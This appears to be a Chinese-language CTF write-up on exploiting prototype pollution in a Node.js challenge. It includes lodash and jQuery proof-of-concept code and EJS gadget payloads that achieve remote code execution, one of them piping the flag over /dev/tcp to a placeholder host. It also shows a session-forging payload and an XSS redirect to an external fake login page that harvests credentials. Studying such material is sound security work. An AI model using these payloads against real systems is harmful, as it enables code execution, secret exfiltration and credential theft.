## writeup

此题目前后端都存在原型链污染漏洞，漏洞很明显，所以只需要找利用链就可以了。 
利用后端的原型链污染可以进行RCE或者身份伪造等攻击，利用前端的原型链污染可以进行xss等攻击。

所以此题目就是为了让大家尽可能的挖前端或者后端所有使用的库中存在的 gadget 来进行攻击。
如果实在是挖不到第三方库里面的利用链，那么也没有关系，题目的代码本身也留有利用链，也同样可以获得flag。


**题目要求：获取管理员密码**


### 漏洞简述 

1. 后端的原型链污染漏洞

```
const mergeFn = require('lodash').defaultsDeep;
const payload = '{"test": [{"constructor":{"prototype": {"a0": true}} }]}'

function check() {
    mergeFn({}, JSON.parse(payload));
    if (({})[`a0`] === true) {
        console.log(`Vulnerable to Prototype Pollution via ${payload}`);
    }
    }

check();

```


2. 前端的原型链污染漏洞

```

$.extend(true, {}, JSON.parse('{"header":[{"__proto__": {"devMode": true}}]}'))
console.log({}.devMode); // true

```

### 利用ejs进行rce 

#### 解法一 

查看ejs的源码，看到下面代码：

```js

    if (!this.source) {
      this.generateSource();
      prepended += '  var __output = [], __append = __output.push.bind(__output);' + '\n';
      if (opts.outputFunctionName) {
        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
      }
      if (opts._with !== false) {
        prepended +=  '  with (' + opts.localsName + ' || {}) {' + '\n';
        appended += '  }' + '\n';
      }
      appended += '  return __output.join("");' + '\n';
      this.source = prepended + this.source + appended;
    }
```

在看后面是一个动态函数生成

```js
    else {
        ctor = Function;
      }
      fn = new ctor(opts.localsName + ', escapeFn, include, rethrow', src);
    }
```

所以需要伪造 `outputFunctionName` 为一段恶意代码，就可以实现rce ，payload如下：

```json
{"type":"test","content":{"constructor":{"prototype":
{"outputFunctionName":"a=1;process.mainModule.require('child_process').exec('b
ash -c \"echo $FLAG>/dev/tcp/xxxxx/xx\"')//"}}}}
```

#### 解法二


```js
    var escapeFn = opts.escapeFunction;
    var ctor;

    ....

    if (opts.client) {
      src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
      if (opts.compileDebug) {
        src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
      }
    }

```

伪造 `escapeFunction` 实现rce，payload如下：

```
{"constructor": {"prototype": {"client": true,"escapeFunction": "1; return
process.env.FLAG","debug":true, "compileDebug": true}}}
```

### 不使用第三方库中利用链的解法

##### 第一步: 利用后端的漏洞污染 session 

```json
{"type":"test","content":{"constructor":{"prototype":{"login":true,"userid":1}}}}
```

##### 第二步: 利用前端漏洞进行xss

本来是想挖一个jquery库中的利用链的，但是奈何找不到，只能自己写一个了。

```json
{"type":"test","content":{"__proto__": {"logger": "<script>window.location='http://wonderkun.cc/hack.html'</script>"}}}
```

```html

<!-- hack.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
    <form action="#" method="get" class="am-form">
        <label for="email">用户名:</label>
        <input type="text" name="username" id="email" value="">
        <br>
        <label for="password">密码:</label>
        <input type="password" name="password" id="password" value="">
        <br>
        <label for="remember-me">
          <input id="remember-me" type="checkbox">
          记住密码
        </label>
        <br />
        <div class="am-cf">
          <input type="submit" name="" value="登录" class="am-btn am-btn-primary am-btn-sm am-fl">
          <input type="button" onclick="location.replace('<%= next %>')" value="注册" class="am-btn am-btn-default am-btn-sm am-fr">
        </div>
      </form>
</body>
</html>
```


### 结语

原型链污染漏洞的危害实在是不可小觑，我也不清楚这份代码里还有没有别的利用链。
如果您找到了新的玩法，或者对原型链污染漏洞利用链自动化挖掘有想法，可以联系我，带我学习一下。